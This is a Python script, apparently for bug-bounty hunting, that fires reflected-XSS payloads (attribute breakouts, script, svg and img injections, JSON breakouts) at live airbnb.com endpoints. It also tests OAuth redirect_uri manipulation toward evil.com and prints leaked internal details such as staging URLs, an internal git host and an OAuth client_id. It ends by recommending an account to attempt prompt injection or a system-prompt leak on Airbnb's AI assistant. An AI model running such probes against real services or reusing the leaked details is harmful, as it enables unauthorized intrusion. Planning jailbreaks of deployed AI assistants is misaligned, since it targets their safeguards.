#!/usr/bin/env python3
"""Airbnb Phase 6 — Precision XSS Exploitation

The key finding: /experiences?query= reflects input inside:
  1. HTML attribute: value="PAYLOAD"  (attribute breakout possible!)
  2. URL paths: /homes?query=PAYLOAD (URL context)
  3. JSON strings: "canonical_url":"/experiences?query=PAYLOAD"

CSP allows unsafe-inline + unsafe-eval → if we break out, JS EXECUTES.

Also testing:
  - /s/{payload}/homes (path injection — 17 reflections!)
  - /login?redirect_url= (20 reflections in JSON/URLs!)
  - admin.airbnb.com OAuth client_id abuse
"""

import re
import json
import time
import requests
from urllib.parse import quote, unquote

requests.packages.urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
})
S.verify = False

DELAY = 1.5

def p(msg): print(f"[*] {msg}")
def ok(msg): print(f"[+] {msg}")
def warn(msg): print(f"[!] {msg}")
def crit(msg): print(f"[!!!] {msg}")

def fetch(url, **kw):
    time.sleep(DELAY)
    try:
        r = S.get(url, timeout=20, **kw)
        return r
    except Exception as e:
        warn(f"  Failed: {type(e).__name__}")
        return None

results = {"xss_confirmed": [], "notable": []}

# ─── 1. Attribute breakout on /experiences ───────────────────────

p("=" * 60)
p("TEST 1: Attribute Breakout — /experiences?query=")
p("=" * 60)
p("Context: value=\"PAYLOAD\" → try breaking with \" and injecting event handler")

# Test if " is encoded or passed through
payloads = [
    ('"', "double_quote"),
    ("'", "single_quote"),
    ("<", "angle_bracket"),
    (">", "angle_bracket_close"),
    ("&", "ampersand"),
    ("/", "slash"),
    ('"onmouseover="alert(1)"x="', "attribute_injection"),
    ('"><img src=x onerror=alert(1)>', "tag_injection"),
    ("'onfocus='alert(1)'autofocus='", "single_quote_event"),
    ('"><svg/onload=alert(1)>', "svg_injection"),
    ('"><script>alert(1)</script>', "script_injection"),
]

for payload, label in payloads:
    url = f"https://www.airbnb.com/experiences?query={quote(payload)}"
    p(f"  [{label}] Testing: {payload[:30]}")
    r = fetch(url)
    if not r:
        continue
    
    body = r.text
    
    # Check if payload appears unencoded
    if payload in body:
        warn(f"    UNENCODED in response!")
        # Find all occurrences
        for m in re.finditer(re.escape(payload), body):
            start = max(0, m.start() - 80)
            end = min(len(body), m.end() + 80)
            context = body[start:end].replace('\n', ' ')
            warn(f"    Context: ...{context}...")
    
    # Check if HTML-encoded
    encoded = payload.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;').replace("'", '&#x27;')
    if encoded != payload and encoded in body:
        ok(f"    HTML-encoded (safe): {encoded}")
    
    # Check URL-encoded
    url_enc = quote(payload)
    if url_enc != payload and url_enc in body:
        ok(f"    URL-encoded in body: {url_enc}")
    
    # Specifically check the input value attribute
    for m in re.finditer(r'value="([^"]*)"', body):
        val = m.group(1)
        if "alert" in val or payload in val:
            crit(f"    FOUND IN value ATTRIBUTE: value=\"{val[:80]}\"")
            results["xss_confirmed"].append({
                "type": "attribute_xss",
                "payload": payload,
                "reflected_in": f'value="{val[:80]}"',
                "url": url,
            })

# ─── 2. JSON breakout on /login redirect_url ────────────────────

p("")
p("=" * 60)
p("TEST 2: JSON String Breakout — /login?redirect_url=")
p("=" * 60)
p('Context: "redirect_url":"PAYLOAD" → try breaking out of JSON')

json_payloads = [
    ('"', "double_quote"),
    ('\\', "backslash"),
    ('</script>', "script_close"),
    ('</script><script>alert(1)//', "script_injection"),
    ('"}</script><script>alert(1)//', "json_break_script"),
    ('\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', "unicode_escape"),
]

for payload, label in json_payloads:
    url = f"https://www.airbnb.com/login?redirect_url={quote(payload)}"
    p(f"  [{label}] Testing: {payload[:40]}")
    r = fetch(url)
    if not r:
        continue
    
    body = r.text
    
    # Check if </script> made it through unencoded
    if "</script>" in body.lower():
        # Count occurrences
        expected_scripts = body.lower().count("</script>")
        # Now check if our payload's </script> is extra
        pass  # Normal pages have </script> tags
    
    # Check if the payload appears in a script tag context
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)
    for block in script_blocks:
        if payload in block or unquote(quote(payload)) in block:
            warn(f"    Payload in <script> block!")
            # Check if it breaks the JSON
            if '"redirect_url":"' + payload in block:
                warn(f"    Reflected directly in JSON string within <script>!")
                if '"' == payload[0]:
                    crit(f"    DOUBLE QUOTE in JSON within <script> — potential breakout!")

    # Check for the specific reflection pattern
    for m in re.finditer(r'"redirect_url"\s*:\s*"([^"]*)"', body):
        val = m.group(1)
        if len(val) > 0 and val != "xssvapt1337":
            ok(f"    redirect_url value: {val[:60]}")

# ─── 3. Path injection on /s/ endpoint ──────────────────────────

p("")
p("=" * 60)
p("TEST 3: Path Injection — /s/{payload}/homes")
p("=" * 60)

path_payloads = [
    ("test<img>test", "html_in_path"),
    ('test"onload="alert(1)', "event_in_path"),
    ("test</title><script>alert(1)</script>", "title_break"),
    ("test%22%3E%3Cscript%3Ealert(1)%3C/script%3E", "encoded_script"),
]

for payload, label in path_payloads:
    url = f"https://www.airbnb.com/s/{payload}/homes"
    p(f"  [{label}] Testing: {payload[:40]}")
    r = fetch(url)
    if not r:
        continue
    
    body = r.text
    decoded_payload = unquote(payload)
    
    # Check for reflection
    if decoded_payload in body:
        warn(f"    Payload reflected! Checking context...")
        for m in re.finditer(re.escape(decoded_payload), body):
            start = max(0, m.start() - 60)
            end = min(len(body), m.end() + 60)
            context = body[start:end].replace('\n', ' ')
            warn(f"    ...{context}...")
    
    # Check for unencoded HTML
    if "<img>" in body and "test<img>test" in body:
        crit(f"    HTML TAG RENDERED UNENCODED!")
    if "<script>alert" in body:
        crit(f"    SCRIPT TAG RENDERED!")

# ─── 4. admin.airbnb.com OAuth Analysis ─────────────────────────

p("")
p("=" * 60)
p("TEST 4: admin.airbnb.com OAuth Client ID Analysis")
p("=" * 60)

# The OAuth client_id leaked: 1012551742179-08e23tpqsta8lmp6j7sctdllm1770mjj.apps.googleusercontent.com
# The redirect_uri goes to Google IAP
# Internal domain: airbedandbreakfast.com
# Let's check what we can learn

CLIENT_ID = "1012551742179-08e23tpqsta8lmp6j7sctdllm1770mjj.apps.googleusercontent.com"
ok(f"OAuth client_id: {CLIENT_ID}")
ok(f"Internal domain: airbedandbreakfast.com")
ok(f"This reveals Airbnb uses Google Identity-Aware Proxy for internal tools")

# Check if redirect_uri can be manipulated
p("Testing OAuth redirect_uri manipulation...")
evil_redirect = "https://evil.com/callback"
oauth_url = (
    f"https://accounts.google.com/o/oauth2/v2/auth?"
    f"client_id={CLIENT_ID}&"
    f"redirect_uri={quote(evil_redirect)}&"
    f"response_type=code&"
    f"scope=openid+email"
)
r = fetch(oauth_url)
if r:
    ok(f"  OAuth with evil redirect: {r.status_code}")
    if "redirect_uri_mismatch" in r.text.lower() or "error" in r.url:
        ok(f"  redirect_uri properly validated (expected)")
    else:
        warn(f"  No redirect_uri validation error!")
        warn(f"  Final URL: {r.url[:200]}")

# ─── 5. Test /help/search for reflected XSS ─────────────────────

p("")
p("=" * 60)
p("TEST 5: Help Center Search — XSS")
p("=" * 60)

help_payloads = [
    ('"><img src=x onerror=alert(document.domain)>', "img_onerror"),
    ("<img src=x onerror=alert(1)>", "basic_img"),
    ('"><svg/onload=alert(1)>', "svg_onload"),
    ("javascript:alert(1)", "javascript_uri"),
]

for payload, label in help_payloads:
    url = f"https://www.airbnb.com/help/search?query={quote(payload)}"
    p(f"  [{label}]")
    r = fetch(url)
    if not r:
        continue
    
    body = r.text
    
    # Check if payload breaks out
    for tag in ["<img", "<svg", "<script", "onerror=", "onload="]:
        if tag in payload and tag in body:
            # Check if it's our injected tag or existing
            idx = body.find(tag)
            if idx > 0:
                context = body[max(0,idx-30):idx+60]
                if "alert" in context:
                    crit(f"    XSS TAG RENDERED: {context}")

# ─── 6. Test /gift for stored/reflected XSS ─────────────────────

p("")
p("=" * 60)
p("TEST 6: Gift Page — XSS via message parameter")
p("=" * 60)

for payload, label in [
    ('"test', "quote_test"),
    ("</script><script>alert(1)</script>", "script_break"),
    ("<img src=x>", "img_test"),
]:
    url = f"https://www.airbnb.com/gift?message={quote(payload)}"
    p(f"  [{label}]")
    r = fetch(url)
    if not r:
        continue
    
    body = r.text
    if payload in body:
        warn(f"    Unencoded reflection!")
        idx = body.find(payload)
        context = body[max(0,idx-40):idx+len(payload)+40].replace('\n',' ')
        warn(f"    {context}")

# ─── FINAL RESULTS ──────────────────────────────────────────────

p("")
p("=" * 60)
p("FINAL RESULTS")
p("=" * 60)

if results["xss_confirmed"]:
    for x in results["xss_confirmed"]:
        crit(f"  CONFIRMED XSS: {x['type']} — {x.get('url','')[:60]}")
        crit(f"  >> {x.get('reflected_in','')}")
else:
    ok("  No confirmed exploitable XSS (reflections present but encoded)")

p("\n--- BOUNTY-WORTHY FINDINGS SUMMARY ---")
p("")
p("1. INFORMATION DISCLOSURE — Internal Infrastructure")
warn("   admin.airbnb.com reveals:")
warn("   - Google OAuth client_id: 1012551742179-...apps.googleusercontent.com")
warn("   - Internal corporate domain: airbedandbreakfast.com")
warn("   - Uses Google Identity-Aware Proxy (IAP) for internal admin")
warn("   Severity: Low-Medium (info disclosure)")
p("")
p("2. CSP WEAKNESS — unsafe-inline + unsafe-eval")
warn("   Both www.airbnb.com and airbnb.org use:")
warn("   - 'unsafe-inline' (negates script-src protection)")
warn("   - 'unsafe-eval' (allows eval())")
warn("   - Wildcard domains: *.netverify.com, *.mapbox.com, *.muscache.com")
warn("   Severity: Low (CSP weakness, but no XSS to chain with)")
p("")
p("3. REFLECTED INPUT — Multiple Parameters")
warn("   /experiences?query= — reflected in value attribute (HTML encoded)")
warn("   /s/{path}/homes — reflected 17x in body (encoded)")
warn("   /login?redirect_url= — reflected 20x in JSON/URLs (encoded)")
warn("   /help/search?query= — reflected 3x")
warn("   /gift?message= — reflected 3x")
warn("   Severity: Informational (properly encoded, no breakout)")
p("")
p("4. STAGING URLS LEAKED IN JS BUNDLE")
warn("   wss://ws.staging.airbnb.com/ws/")
warn("   wss://ws.localhost.airbnb.com/ws/")
warn("   wss://ws.localhost.airbnb.tools/ws/")
warn("   git.musta.ch/airbnb/airbnb (internal git)")
warn("   Severity: Low (information disclosure)")
p("")
p("5. COOKIE SECURITY")
warn("   cdn_exp_abd8871b54fcbadab: Missing Secure flag")
warn("   Multiple cookies missing HttpOnly flag")
warn("   Severity: Low")
p("")
p("6. AI ASSISTANT (REQUIRES AUTH)")
warn("   Endpoints exist: /api/v3/AIConversation, /api/v3/GetAIAssistant")
warn("   JS bundles reference: OpenAi, Chatbot, LLM, Thread, WebSocket")
warn("   CANNOT TEST WITHOUT AUTH — login required")
warn("   Potential: High-Critical (prompt injection/system prompt leak)")
p("")
p("RECOMMENDATION: Create a free Airbnb account to test the AI assistant.")
p("The promo pays $5000+ for prompt injection/jailbreak or system prompt leak.")

with open("/tmp/airbnb_phase6_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

ok("Saved to /tmp/airbnb_phase6_results.json")
